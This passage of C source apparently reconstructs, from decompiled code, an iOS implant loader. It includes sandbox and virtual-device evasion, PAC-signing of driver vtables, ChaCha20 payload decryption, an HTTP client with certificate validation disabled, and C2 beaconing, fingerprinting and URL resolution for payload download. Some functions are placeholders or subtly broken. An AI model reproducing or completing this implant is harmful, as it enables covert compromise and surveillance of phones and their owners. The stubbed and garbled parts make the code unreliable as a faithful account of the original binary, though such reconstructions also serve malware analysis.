                      *(uint32_t *)(header[1] + 168));

    drv[0] = header[1];
    err = dispatch_call(ctx, header[1], (int64_t)"_driver");
    if (err) goto fail;

    /* The driver descriptor must be version 2 with at least 2 entries */
    uint16_t *desc = *(uint16_t **)(drv + 1);
    if (!desc || desc[0] != 2 || desc[1] < 2)
    { err = 163847; goto fail; }

    /* PAC-sign 8 function pointers from the driver vtable */
    for (int i = 0; i < 8; i++) {
        pac_strip();
        *(uint64_t *)(*(uint64_t *)(drv + 1) + 16 + i * 8) = /* pac_signed(fn) */ 0;
    }

    *out = (uint64_t)drv;
    return 0;

fail:
    if (header[1] && *(uint64_t *)(ctx + 304))
        dispatch_call(ctx, header[1], 0);
    free(drv);
    return err;
}

static int32_t load_default_driver(int64_t ctx, uint64_t *out) {          // sub_8798
    return load_driver(ctx, 589824, out);
}

static int32_t driver_dispatch(int64_t drv, int64_t a2, int64_t a3) {     // sub_87D8
    if (!drv || !a3) return ERR_INVALID_ARG;
    int64_t vtable = *(int64_t *)(drv + 8);
    if (!vtable) return 163846;
    return dispatch_call(vtable, a2, a3);
}

static int32_t driver_call(int64_t drv, int64_t a2, int64_t a3) {         // sub_8840
    if (!drv) return ERR_INVALID_ARG;
    if (!a2) return 163842;
    int64_t vtable = *(int64_t *)(drv + 8);
    if (!vtable) return 163846;
    return dispatch_call(vtable, a2, a3);
}

static int32_t driver_call_v2(int64_t drv, int64_t a2, int64_t a3) {      // sub_88B4
    if (!drv) return ERR_INVALID_ARG;
    if (!a2) return 163842;
    int64_t vtable = *(int64_t *)(drv + 8);
    if (!vtable) return 163846;
    return dispatch_call(vtable, a2, a3);
}

static int32_t release_driver(int64_t ctx, uint64_t *drv) {               // sub_8928
    if (!ctx || !drv) return ERR_INVALID_ARG;

    int64_t vtable = (int64_t)drv[1];
    if (!vtable) return 163846;

    dispatch_call(vtable, (int64_t)drv, 0);
    int32_t err = dispatch_call(ctx, (int64_t)drv[0], 0);
    drv[0] = 0;
    drv[1] = 0;
    free(drv);
    return err;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Sandbox checks
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t check_sandbox_permissions(int64_t ctx, bool *out) {        // sub_89CC
    if (!ctx || !out) return ERR_INVALID_ARG;

    bool sandboxed = false;

    if (!(is_virtual_device(ctx) & 1)) {
        uint32_t osver = *(uint32_t *)(ctx + 192);

        if (osver > 0x100500 || (osver - 984839 <= 0xF8F8)) {
            sandboxed = (int)sandbox_check(getpid(), NULL, 0) > 0;
        } else if (osver >= 0x100000) {
            sandboxed = (int)sandbox_check(getpid(), "iokit-open-service",
                         SANDBOX_CHECK_NO_REPORT) > 0;
        }
    }

    *out = sandboxed;
    return 0;
}

static int32_t detect_user_agent(int64_t ctx) {                           // sub_8AB8
    if (!ctx) return ERR_INVALID_ARG;

    bool sandboxed = false;
    int32_t err = check_sandbox_permissions(ctx, &sandboxed);
    if (err) return err;

    *(uint8_t *)(ctx + 1512) = sandboxed;
    const char *ua = *(const char **)(ctx + 160);
    *(uint8_t *)(ctx + 1516) = (ua && strncasecmp("MobileStore/1.0", ua, 15) == 0);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  WebContent sandbox check (ASM only — decompiler failed)
 *
 *  sub_7720: 888 bytes, references "WebContent", "RELEASE", "xnu-",
 *  "xnu-%d.%d.%d.%d.%d%*s". Calls task_info, strstr, get_os_version,
 *  sysctl, host_kernel_version, sscanf, check_chip_model_a/b.
 *
 *  Determines if running inside a WebContent sandbox, parses the
 *  kernel version string, and checks hardware compatibility.
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t check_webcontent_sandbox(int64_t ctx /*, ... */) {         // sub_7720
    /* ASM-only function — cannot be decompiled.
     * Reconstructed logic from assembly + string refs:
     *
     * 1. task_info(TASK_BASIC_INFO) to get process name
     * 2. strstr(name, "WebContent") — detect if in WebContent sandbox
     * 3. host_kernel_version() → parse "xnu-%d.%d.%d.%d.%d" with sscanf
     * 4. strstr(kernel_ver, "RELEASE") — check for release kernel
     * 5. get_os_version() → store packed version at ctx+192
     * 6. check_chip_model_b() → store at ctx+224
     * 7. check_chip_model_a() → additional validation
     *
     * Returns 0 on success, error code otherwise.
     */
    (void)ctx;
    return 0; /* placeholder */
}

/* ═══════════════════════════════════════════════════════════════════════
 *  ChaCha20 stream cipher
 * ═══════════════════════════════════════════════════════════════════════ */

static void chacha20_block(int64_t key, int64_t data, int64_t data_len) { // sub_AD8C
    if (!key || !data || !data_len) return;

    uint32_t state[16];
    uint32_t working[16];

    /* "expand 32-byte k" constant at state[0..3] */
    static const uint8_t sigma[16] = "expand 32-byte k";
    memcpy(&state[0], sigma, 16);
    /* Key at state[4..11] */
    memcpy(&state[4], (void *)key, 32);
    /* Counter + nonce at state[12..15] */
    state[12] = 0; state[13] = 0; state[14] = 0; state[15] = 0;

    uint64_t ks_pos = 64; /* force block generation on first byte */

    for (int64_t i = 0; i < data_len; i++) {
        if (ks_pos >= 64) {
            memcpy(working, state, 64);

            /* 20 rounds (10 double-rounds) */
            for (int r = 0; r < 10; r++) {
                #define ROR32(x, n) (((x) >> (n)) | ((x) << (32 - (n))))
                #define QR(a, b, c, d) do {                     \
                    a += b; d ^= a; d = ROR32(d, 16);           \
                    c += d; b ^= c; b = ROR32(b, 20);           \
                    a += b; d ^= a; d = ROR32(d, 24);           \
                    c += d; b ^= c; b = ROR32(b, 25);           \
                } while(0)

                /* Column round */
                QR(working[0], working[4], working[8],  working[12]);
                QR(working[1], working[5], working[9],  working[13]);
                QR(working[2], working[6], working[10], working[14]);
                QR(working[3], working[7], working[11], working[15]);
                /* Diagonal round */
                QR(working[0], working[5], working[10], working[15]);
                QR(working[1], working[6], working[11], working[12]);
                QR(working[2], working[7], working[8],  working[13]);
                QR(working[3], working[4], working[9],  working[14]);

                #undef QR
                #undef ROR32
            }

            for (int j = 0; j < 16; j++)
                working[j] += state[j];

            if (++state[12] == 0) state[13]++;
            ks_pos = 0;
        }

        ((uint8_t *)data)[i] ^= ((uint8_t *)working)[ks_pos++];
    }
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Decrypt + decompress pipeline
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t decrypt_and_process(int64_t ctx, uint8_t *key,             // sub_AC44
                                    char flags, int64_t a4,
                                    uint64_t *out, uint32_t *out_len,
                                    int64_t a7, int64_t a8,
                                    int a9, int a10, int64_t a11) {
    if (!ctx) return ERR_INVALID_ARG;
    if (!*(uint64_t *)(ctx + 64) || !key) return ERR_INVALID_ARG;
    if (!*key || !a4 || !out || !out_len) return ERR_INVALID_ARG;

    uint64_t dec_data = 0;
    uint32_t dec_size = 0;

    int32_t err = dispatch_call(ctx, (int64_t)key, (int64_t)&dec_data);
    if (err) return err;

    /* If flag bit 0: skip crypto. If flag bit 1: LZMA decompress. */
    if (flags & 1) {
        /* raw — no crypto */
    } else if (flags & 2) {
        err = decompress_lzma((uint8_t **)&dec_data, &dec_size);
        if (err) {
            bzero((void *)dec_data, dec_size);
            free((void *)dec_data);
            return err;
        }
    }

    err = dispatch_call(ctx, 0, dec_data);
    if (err) {
        bzero((void *)dec_data, dec_size);
        free((void *)dec_data);
        return err;
    }

    *out = a11;
    *out_len = a10;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  String formatting helper
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t format_string(char **out, uint32_t *out_len,               // sub_9A34
                              const char *fmt, ...) {
    if (!out || !out_len || !fmt) return ERR_INVALID_ARG;

    va_list ap;
    va_start(ap, fmt);
    int needed = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);

    if (needed < 1) {
        *out = NULL;
        *out_len = 0;
        return ERR_HTTP_URL;
    }

    size_t alloc_size = (unsigned)(needed + 1);
    char *buf = (char *)malloc(alloc_size);
    if (!buf) { *out = NULL; *out_len = 0; return ERR_ALLOC_FAIL; }

    va_start(ap, fmt);
    int written = vsnprintf(buf, alloc_size, fmt, ap);
    va_end(ap);

    if (written > needed) {
        bzero(buf, alloc_size);
        free(buf);
        *out = NULL; *out_len = 0;
        return ERR_DECOMPRESS;
    }

    buf[needed] = '\0';
    *out = buf;
    *out_len = written;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  C2 message formatting
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t format_c2_message(char event_type, int64_t filename,        // sub_94B4
                                  int64_t a3, ...) {
    char *inner = NULL;
    uint32_t inner_len = 0;
    int32_t err;

    if (filename)
        err = format_string(&inner, &inner_len,
            "{\\\"e\\\":%u,\\\"f\\\":\\\"%s\\\",\\\"l\\\":%u}",
            (unsigned)event_type);
    else
        err = format_string(&inner, &inner_len,
            "{\\\"e\\\":%u,\\\"l\\\":%u}",
            (unsigned)event_type);

    if (!err) {
        err = format_string(NULL, NULL,
            "{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}",
            inner);
        bzero(inner, inner_len);
        free(inner);
    }
    return err;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  HTTP client (CoreFoundation-based, full implementation)
 * ═══════════════════════════════════════════════════════════════════════ */

static void http_stream_callback(CFReadStreamRef stream,                   // sub_9790
                                  int64_t event_type, int64_t info) {
    if (!stream || !info) {
        CFRunLoopStop(CFRunLoopGetCurrent());
        return;
    }

    if (event_type == 2) {
        /* kCFStreamEventHasBytesAvailable */
        UInt8 buf[4096];
        CFIndex bytes = CFReadStreamRead(stream, buf, 4096);
        if (bytes > 0)
            CFHTTPMessageAppendBytes(*(CFHTTPMessageRef *)info, buf, bytes);
        else
            CFRunLoopStop(CFRunLoopGetCurrent());
        return;
    }

    switch (event_type) {
    case 4:  /* kCFStreamEventCanAcceptBytes */
        break;
    case 8:  /* kCFStreamEventErrorOccurred */
        *(int32_t *)(info + 8) = 12296;
        break;
    case 16: /* kCFStreamEventEndEncountered */ {
        CFHTTPMessageRef resp = (CFHTTPMessageRef)CFReadStreamCopyProperty(
            stream, kCFStreamPropertyHTTPResponseHeader);
        if (resp) {
            *(int32_t *)(info + 12) = CFHTTPMessageGetResponseStatusCode(resp);
            CFRelease(resp);
        }
        break;
    }
    }
    CFRunLoopStop(CFRunLoopGetCurrent());
}

/*
 * sub_8B5C — Full HTTP request implementation.
 * Supports GET/POST, HTTPS with SSL settings, proxy configuration,
 * retry up to 7 times, and response body extraction.
 */
static int32_t http_request(const char *url_str, const char *user_agent,   // sub_8B5C
                             const char *content_type, const char *body_str,
                             uint64_t body_len, uint64_t resp_max) {
    if (!url_str || !*url_str) return ERR_INVALID_ARG;

    bool want_response = (body_len != 0) && (resp_max != 0);
    if ((!body_len != !resp_max) && (body_len | resp_max))
        return ERR_INVALID_ARG;

    CFStringRef url_cf = CFStringCreateWithCString(
        kCFAllocatorDefault, url_str, kCFStringEncodingUTF8);
    if (!url_cf) return 12290;
    if (CFStringGetLength(url_cf) < 1) { CFRelease(url_cf); return 12291; }

    CFStringRef ua_cf = NULL;
    if (user_agent) {
        ua_cf = CFStringCreateWithCString(kCFAllocatorDefault, user_agent,
                                          kCFStringEncodingUTF8);
        if (!ua_cf) { CFRelease(url_cf); return 12310; }
        if (CFStringGetLength(ua_cf) <= 0) {
            CFRelease(url_cf); CFRelease(ua_cf); return 12311;
        }
    }

    CFStringRef ct_cf = NULL;
    if (content_type) {
        ct_cf = CFStringCreateWithCString(kCFAllocatorDefault, content_type,
                                          kCFStringEncodingUTF8);
        if (!ct_cf) { CFRelease(url_cf); if (ua_cf) CFRelease(ua_cf); return 12310; }
    }

    CFDataRef body_data = NULL;
    if (body_str) {
        body_data = CFDataCreate(kCFAllocatorDefault,
            (const UInt8 *)body_str, strlen(body_str));
        if (!body_data) {
            CFRelease(url_cf); if (ua_cf) CFRelease(ua_cf);
            if (ct_cf) CFRelease(ct_cf); return 12312;
        }
    }

    const char *method_str = body_data ? "POST" : "GET";
    int32_t result = ERR_INVALID_ARG;
    CFDataRef response_cf = NULL;

    for (uint32_t attempt = 0; attempt <= 7; attempt++) {
        if (want_response && response_cf) response_cf = NULL;

        CFURLRef url = CFURLCreateWithString(kCFAllocatorDefault, url_cf, NULL);
        if (!url) { result = 12290; continue; }

        CFStringRef scheme = CFURLCopyScheme(url);
        if (!scheme) { CFRelease(url); result = 12301; break; }

        CFStringRef method_cf = CFStringCreateWithCString(
            kCFAllocatorDefault, method_str, kCFStringEncodingUTF8);
        if (!method_cf) { CFRelease(url); CFRelease(scheme); result = ERR_ALLOC_FAIL; break; }

        CFHTTPMessageRef request = CFHTTPMessageCreateRequest(
            kCFAllocatorDefault, method_cf, url, kCFHTTPVersion1_1);
        if (!request) {
            CFRelease(method_cf); CFRelease(url); CFRelease(scheme);
            result = 12297; break;
        }

        if (body_data) CFHTTPMessageSetBody(request, body_data);

        if (ua_cf) {
            CFStringRef hdr = CFStringCreateWithCString(
                kCFAllocatorDefault, "User-Agent", kCFStringEncodingUTF8);
            if (hdr) { CFHTTPMessageSetHeaderFieldValue(request, hdr, ua_cf); CFRelease(hdr); }
        }
        if (ct_cf) {
            CFStringRef hdr = CFStringCreateWithCString(
                kCFAllocatorDefault, "Content-Type", kCFStringEncodingUTF8);
            if (hdr) { CFHTTPMessageSetHeaderFieldValue(request, hdr, ct_cf); CFRelease(hdr); }
        }

        CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(
            kCFAllocatorDefault, request);
        if (!stream) {
            CFRelease(request); CFRelease(method_cf);
            CFRelease(url); CFRelease(scheme);
            result = 12298; break;
        }

        /* SSL if HTTPS */
        CFStringRef https_cf = CFStringCreateWithCString(
            kCFAllocatorDefault, "https", kCFStringEncodingUTF8);
        if (https_cf && CFEqual(https_cf, scheme)) {
            /* Disable certificate validation (!) */
            const void *keys[] = { kCFStreamSSLValidatesCertificateChain };
            const void *vals[] = { kCFBooleanFalse };
            CFDictionaryRef ssl = CFDictionaryCreate(kCFAllocatorDefault,
                keys, vals, 1, NULL, NULL);
            if (ssl) {
                CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, ssl);
                CFRelease(ssl);
            }
        }

        /* Proxy settings */
        CFDictionaryRef proxies = SCDynamicStoreCopyProxies(NULL);
        if (proxies) {
            CFReadStreamSetProperty(stream, kCFStreamPropertyHTTPProxy, proxies);
            CFRelease(proxies);
        }

        /* Response collector: [CFHTTPMessage, pad, error_code, status_code] */
        CFHTTPMessageRef resp_msg = CFHTTPMessageCreateEmpty(kCFAllocatorDefault, false);
        if (resp_msg) {
            int64_t *collector = (int64_t *)calloc(16, 1);
            if (collector) {
                collector[0] = (int64_t)resp_msg;
                ((int32_t *)collector)[3] = 500; /* default status */

                CFStreamClientContext client_ctx = {0, collector, NULL, NULL, NULL};
                void (*cb)(CFReadStreamRef, CFStreamEventType, void *) =
                    (void *)pac_sign_if_available((uint64_t)http_stream_callback, 0);

                if (CFReadStreamSetClient(stream, 0x1A, cb, &client_ctx)) {
                    CFReadStreamScheduleWithRunLoop(stream,
                        CFRunLoopGetCurrent(), kCFRunLoopCommonModes);
                    if (CFReadStreamOpen(stream)) {
                        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 240.0, false);
                        CFReadStreamClose(stream);

                        result = ((int32_t *)collector)[2]; /* error code */
                        if (!result) {
                            int status = ((int32_t *)collector)[3];
                            if (status > 399) result = 12305;
                        }

                        if (!result && want_response) {
                            CFDataRef body = CFHTTPMessageCopyBody(
                                *(CFHTTPMessageRef *)collector);
                            if (body)
                                response_cf = body;
                            else
                                result = 12313;
                        }
                    } else {
                        result = 12299;
                    }
                } else {
                    result = 12304;
                }
                free(collector);
            }
            CFRelease(resp_msg);
        }

        CFRelease(stream);
        CFRelease(request);
        CFRelease(method_cf);
        CFRelease(url);
        CFRelease(scheme);
        if (https_cf) CFRelease(https_cf);

        if (!result) break; /* success */
    }

    /* Copy response body if needed */
    if (!result && want_response && response_cf) {
        CFIndex len = CFDataGetLength(response_cf);
        if (len > 0) {
            const UInt8 *bytes = CFDataGetBytePtr(response_cf);
            if (bytes) {
                void *copy = malloc(len);
                if (copy) {
                    memcpy(copy, bytes, len);
                    *(void **)body_len = copy;
                    *(uint32_t *)resp_max = (uint32_t)len;
                } else {
                    result = ERR_ALLOC_FAIL;
                }
            } else {
                result = 12293;
            }
        } else {
            result = 12292;
        }
    }

    CFRelease(url_cf);
    if (ua_cf) CFRelease(ua_cf);
    if (ct_cf) CFRelease(ct_cf);
    if (body_data) CFRelease(body_data);
    if (response_cf) CFRelease(response_cf);

    return result;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  C2 communication protocol
 * ═══════════════════════════════════════════════════════════════════════ */

/*
 * sub_987C — C2 request through shared memory + semaphore handshake.
 * The worker thread communicates with the main C2 thread via a shared
 * 16MB buffer at ctx+1504, protected by a semaphore at ctx+1528.
 *
 * Buffer layout:
 *   +0: state (0=idle, 1=GET, 5=cancelled, 7=POST, 3=response_ok, 4=error)
 *   +4: url string (up to 0x7FFFFC bytes)
 *   +0x800000: body string (up to 0x800000 bytes)
 *   After response: +4 = response_size, +8 = response_data
 */
static int32_t c2_request_with_semaphore(int64_t ctx, const char *url,     // sub_987C
                                          const char *body, int64_t timeout,
                                          uint64_t *out, uint32_t *out_len) {
    if (!out || !out_len) return ERR_INVALID_ARG;
    *out = 0; *out_len = 0;

    if (semaphore_wait(*(semaphore_t *)(ctx + 1528)))
        return 12309;

    if (!timeout) goto timed_out;

    int64_t remaining = timeout;
    int32_t *state = *(int32_t **)(ctx + 1504);

    /* Wait for idle state */
    while (*state != 0) {
        if (*state == 5) break;
        thread_switch(0, 2, 1);
        if (--remaining == 0) break;
    }

    /* Write request */
    strncpy((char *)(state + 1), url, 0x7FFFFC);
    *((uint8_t *)state + 0x7FFFFF) = 0;

    int32_t *st = *(int32_t **)(ctx + 1504);
    if (body) {
        strncpy((char *)st + 0x800000, body, 0x800000);
        *((uint8_t *)st + 0xFFFFFF) = 0;
        *st = 7; /* POST */
    } else {
        *st = 1; /* GET */
    }

    /* Wait for response (state 3 or 4) */
    while (1) {
        int32_t *rsp = *(int32_t **)(ctx + 1504);
        int s = *rsp;
        if ((unsigned)(s - 3) < 2) {
            *rsp = 0;
            if (s == 3) {
                uint32_t rsp_size = (uint32_t)rsp[1];
                if (!rsp_size) {
                    semaphore_signal(*(semaphore_t *)(ctx + 1528));
                    return 12306;
                }
                void *copy = malloc(rsp_size);
                if (!copy) {
                    semaphore_signal(*(semaphore_t *)(ctx + 1528));
                    return ERR_ALLOC_FAIL;
                }
                memcpy(copy, rsp + 2, rsp_size);
                *out = (uint64_t)copy;
                *out_len = rsp_size;
                semaphore_signal(*(semaphore_t *)(ctx + 1528));
                return 0;
            }
            /* s == 4 → error */
            semaphore_signal(*(semaphore_t *)(ctx + 1528));
            return 12309;
        }
        thread_switch(0, 2, 1);
        if (--timeout == 0) break;
    }

timed_out:
    **(int32_t **)(ctx + 1504) = 0;
    semaphore_signal(*(semaphore_t *)(ctx + 1528));
    return 12309;
}

/*
 * sub_9300 — C2 poll handler: routes requests either through the
 * shared-memory semaphore IPC (if ctx+1504 is set) or directly
 * via HTTP.
 */
static int32_t c2_poll_handler(int64_t ctx, char *url,                     // sub_9300
                                uint64_t body_len, uint64_t resp_max) {
    if (!ctx || !url) return ERR_INVALID_ARG;
    if ((!*url || !body_len) || !resp_max) return ERR_INVALID_ARG;

    if (*(uint64_t *)(ctx + 1504))
        return c2_request_with_semaphore(ctx, url, NULL, 0, NULL, NULL);
    else
        return http_request(url, *(const char **)(ctx + 160), NULL, NULL, body_len, resp_max);
}

static int32_t send_json_request(char *url, const char *user_agent,        // sub_9398
                                  char event_type) {
    if (!url || !*url) return 0;
    if (strncmp(url, "http://", 7) && strncmp(url, "https://", 8))
        return ERR_HTTP_URL;

    int32_t err = format_c2_message(event_type, 0, 0);
    if (!err) {
        err = http_request(url, user_agent, "application/json", NULL, 0, 0);
        bzero(NULL, 0);
        free(NULL);
    }
    return err;
}

/*
 * sub_9580 — send C2 beacon. Routes through semaphore IPC if available,
 * otherwise falls back to direct HTTP.
 */
static int32_t send_c2_beacon(int64_t ctx, char event_type, ...) {         // sub_9580
    if (!ctx) return ERR_INVALID_ARG;

    if (!*(uint64_t *)(ctx + 1504))
        return send_json_request(*(char **)(ctx + 168),
                                 *(const char **)(ctx + 160), event_type);

    const char *url = *(const char **)(ctx + 168);
    if (!url || !*url) return 0;
    if (strncmp(url, "http://", 7) && strncmp(url, "https://", 8))
        return ERR_HTTP_URL;

    int32_t err = format_c2_message(event_type, 0, 0);
    if (!err) {
        uint32_t rc = c2_request_with_semaphore(ctx, NULL, NULL, 0, NULL, NULL);
        if (rc) {
            err = (rc == 12306) ? 0 : rc;
        }
    }
    return err;
}

static int32_t init_callbacks(int64_t ctx) {                               // sub_96F8
    if (!ctx) return ERR_INVALID_ARG;

    *(uint64_t *)(ctx + 64)   = (uint64_t)c2_poll_handler;
    *(uint64_t *)(ctx + 1520) = (uint64_t)send_c2_beacon;

    if (!*(uint64_t *)(ctx + 1504))
        return 0;

    kern_return_t kr = semaphore_create(
        mach_task_self(), (semaphore_t *)(ctx + 1528), 0, 1);
    return kr ? (kr | 0x80000000) : 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  C2 URL resolution
 *
 *  sub_9F18: Resolves a relative path from a C2 config blob into an
 *  absolute URL using the base C2 URL from ctx+128. Handles https://
 *  and http:// prefixes, relative paths (./), path joining (%s/%s).
 *  Config blob has magic 0x12345678 at offset 0.
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t resolve_c2_url(int64_t ctx, int id, char *config,          // sub_9F18
                               uint32_t config_size, char *url_out,
                               size_t url_max, uint64_t *entry_out, ...) {
    if (!ctx || !config || config_size < 0x10C
        || *(uint32_t *)config != 0x12345678
        || !config[8] || config[263]
        || !((uint32_t *)config)[66]
        || !url_out || !url_max || !entry_out)
        return 0xA0000 | (uint16_t)-12287;

    if (!id) return 196609; /* no matching entry */

    /* Search entries starting at config+268, each 100 bytes */
    char *end = config + config_size;
    char *entry = config + 268;
    uint64_t idx = 0;

    for (; entry < end && entry + 100 >= config && end >= entry + 100 && !entry[99]; entry += 100) {
        if (*(uint32_t *)entry == (uint32_t)id) break;
        if (++idx >= (uint64_t)((uint32_t *)config)[66])
            return 196609;
    }

    /* Build full URL */
    char url_buf[512] = {0};
    const char *fmt = (config[strlen(config + 8) + 7] == '/') ? "%s%s" : "%s/%s";
    if (snprintf(url_buf, 512, fmt, config + 8, entry + 4) > 511)
        return 708620;

    if (!url_buf[0]) return ERR_INVALID_ARG;

    /* Check if absolute URL */
    if (!memcmp(url_buf, "https://", 8) || !memcmp(url_buf, "http://", 7)) {
        strlcpy(url_out, url_buf, url_max);
        *entry_out = (uint64_t)(entry + 4);
        return 0;
    }

    /* Resolve relative path against base URL from ctx+128 */
    const char *base = *(const char **)(ctx + 128);
    if (!base || !*base) return 196611;

    size_t prefix_len = 8;
    if (strncmp(base, "https://", 8)) {
        prefix_len = 7;
        if (strncmp(base, "http://", 7))
            return 196612;
    }

    const char *after_scheme = base + prefix_len;
    const char *slash = strchr(after_scheme, '/');

    if (slash && url_buf[0] == '/') {
        /* Absolute path relative to host */
        size_t host_len = slash + 1 - base;
        if (host_len + 1 <= url_max)
            strlcpy(url_out, base, host_len + 1);
        else
            strlcpy(url_out, base, url_max);
        /* Skip leading slashes in relative part */
        const char *rel = url_buf;
        while (*rel == '/') rel++;
        strlcat(url_out, rel, url_max);
    } else {
        /* Relative to last path component */
        const char *last_slash = after_scheme;
        if (slash) {
            const char *p = slash + 1;
            char *s;
            while ((s = strchr(p, '/')) != NULL) {
                last_slash = p;
                p = s + 1;
            }
            last_slash = p;
        }
        size_t base_len = last_slash - base;

        const char *rel = url_buf;
        if (url_buf[0] == '.' && url_buf[1] == '/')
            rel = url_buf + 2;

        if (base_len + 1 <= url_max)
            strlcpy(url_out, base, base_len + 1);
        else
            strlcpy(url_out, base, url_max);

        if (!slash) strlcat(url_out, "/", url_max);
        strlcat(url_out, rel, url_max);
    }

    *entry_out = (uint64_t)(entry + 4);
    return 0;
}

/*
 * sub_A294 — ASM-only variant of resolve_c2_url.
 * Simpler path for specific OS version ranges (osver in [0xF0000..0x10000]).
 * Calls is_virtual_device, get_hw_capability_flags, resolve_c2_url.
 */
static int32_t resolve_c2_url_alt(int64_t ctx, char *buf, int buf_size,    // sub_A294
                                   int64_t a4, int64_t a5, int64_t a6) {
    /* ASM-only — reconstructed from instruction analysis:
     *
     * 1. Validate all 6 arguments (CBZ checks)
     * 2. If ctx[0x5E8] (is_sandboxed): check is_virtual_device()
     * 3. Determine hw_flags based on OS version ranges + chip model
     * 4. get_hw_capability_flags(ctx) → combine with hw_flags
     * 5. resolve_c2_url(ctx, combined_flags, buf, buf_size, a4, a5, a6)
     */
    if (!ctx || !buf || !buf_size || !a4 || !a5 || !a6)
        return ERR_INVALID_ARG;

    uint32_t hw_flags = 0;
    if (*(uint8_t *)(ctx + 0x5E8)) {
        if (is_virtual_device(ctx) & 1) {
            hw_flags = 0;
            goto resolve;
        }
    } else {
        hw_flags = 0;
        goto resolve;
    }

    {
        uint32_t osver = *(uint32_t *)(ctx + 192);
        uint32_t os_range = (osver + 0xFFEFFC00) >> 10;
        if (os_range > 0x3E) {
            /* osver >= 0x100401 */
            hw_flags = (osver - 0x100000 < 0x401) ? 0x50000 : 0;
        } else {
            int hw_model = *(int32_t *)(ctx + 0xE0);
            hw_flags = 0x30000;
            /* Check specific chip IDs */
            if (hw_model == 0x1B588BB2 || hw_model == -2023363094 ||
                hw_model == 0x1B588BB3 || hw_model == 0x462504D2 ||
                hw_model == (int)0xDA33D83D)
                ; /* keep 0x30000 */
            else
                hw_flags = (osver - 0x100000 < 0x401) ? 0x50000 : 0;
        }
    }

resolve:;
    uint32_t cap = get_hw_capability_flags(ctx);
    uint32_t combined;
    if (!cap) {
        combined = 0;
    } else if (*(uint8_t *)(ctx + 0xDB) & 1) {
        uint32_t sub = *(uint32_t *)(ctx + 0xDC);
        combined = (sub > 1) ? 0xF3000000 : 0xF2000000;
    } else {
        combined = 0xF1000000;
    }

    return resolve_c2_url(ctx, cap | hw_flags | combined, buf, buf_size,
                          (char *)a4, (size_t)a5, (uint64_t *)a6);
}

/*
 * sub_9CB8 — builds the C2 fingerprint beacon.
 * Combines hardware capability flags, uname info, and calls resolve_c2_url.
 */
static int32_t build_c2_fingerprint(int64_t ctx, char *buf, int buf_size,  // sub_9CB8
                                     int64_t a4, int64_t a5, int64_t a6) {
    if (!ctx || !buf || !buf_size || !a4 || !a5 || !a6)
        return ERR_INVALID_ARG;

    uint32_t is_real = get_hw_capability_flags(ctx);
    if (!is_real) {
        /* Virtual device or unknown — call with zero flags */
        return resolve_c2_url(ctx, 0, buf, buf_size, (char *)a4, (size_t)a5, (uint64_t *)a6);
    }

    uint32_t osver = *(uint32_t *)(ctx + 192);
    uint32_t hw_sub = *(uint32_t *)(ctx + 220);
    uint32_t hw_flags = 0;

    if (osver > 0xF05FF) {
        /* iOS 15.6+ */
        struct utsname uts;
        bzero(&uts, sizeof(uts));
        if (!uname(&uts) &&
            *(uint32_t *)uts.machine == 0x6F685069 && /* "iPho" */
            *(uint16_t *)&uts.machine[4] == 0x656E)   /* "ne"   */
        {
            /* iPhone — encode version info */
            int model_bits = (osver >> 8) & 0xF00;
            int flag = (hw_sub <= 1) ? 0x12000000 : 0x13000000;
            hw_flags = model_bits | (flag & 0xFFFFFFDF) |
                       (32 * ((osver & 0xE00) != 0));
        } else {
            hw_flags = (hw_sub <= 1) ? 0x2000000 : 0xE2000000;
        }
    } else if (osver <= 0xEFFFF) {
        if (osver < 0xE0802) {
            if (osver < 0xD0000) {
                hw_flags = 0;
                is_real = 0;
            } else {
                /* iOS 13.x–14.x: encode model info */
                uint32_t hi = (osver >> 8) & 0xF00;
                uint32_t lo = (osver >> 4) & 0xF0;
                uint32_t patch_flag = 0;
                if (lo >= 0x50)  patch_flag = 80;
                if (lo > 0x6F)   patch_flag = 112;
                if ((osver & 0xF) == 0) patch_flag = 112;
                if (lo >= 0x80)  patch_flag = (osver >> 4) & 0xF0;

                int base = (hw_sub <= 1) ? 0x10000000 : 0x11000000;
                hw_flags = hi | base |
                           ((lo >= 0x80) ? patch_flag : 0) |
                           ((lo >= 0x80) ? (osver & 0xF) : 0);
                if (hi < 0xE00) { hw_flags = base; }
            }
        } else {
            hw_flags = (hw_sub <= 1) ? 0x2000000 : 0xE2000000;
        }
    } else {
        /* iOS 15.0–15.5 */
        hw_flags = (hw_sub <= 1) ? 0x2000000 : 0xE2000000;
    }

    int32_t err = resolve_c2_url(ctx, is_real | hw_flags, buf, buf_size,
                                  (char *)a4, (size_t)a5, (uint64_t *)a6);

    /* Retry with simpler flags on error 196609 */
    if (err == 196609) {
        uint32_t cap2 = get_hw_capability_flags(ctx);
        uint32_t retry_flags;
        if (!cap2) {
            retry_flags = 0;
        } else if (*(uint8_t *)(ctx + 219) & 1) {
            retry_flags = (*(uint32_t *)(ctx + 220) <= 1) ? 0x2000000 : 0xE2000000;
        } else {
            retry_flags = 0x1000000;
        }
        err = resolve_c2_url(ctx, cap2 | retry_flags, buf, buf_size,
                              (char *)a4, (size_t)a5, (uint64_t *)a6);
    }
    return err;
}

/*
 * sub_A418 — main C2 command dispatch.
 * Processes server responses, downloads payloads, executes commands.
 * 1908 bytes — heavily uses dispatch_call for indirect calls.
 *
 * Note: The decompiler produced a truncated result (only the entry
 * validation is visible). The full logic involves:
 * - Checking ctx+272 (config pointer)
 * - Calling dispatch_call to retrieve payload data
 * - Calling is_virtual_device, resolve_c2_url_alt, decrypt_and_process
 * - Managing strdup'd URL strings, cleanup with bzero+free
 */
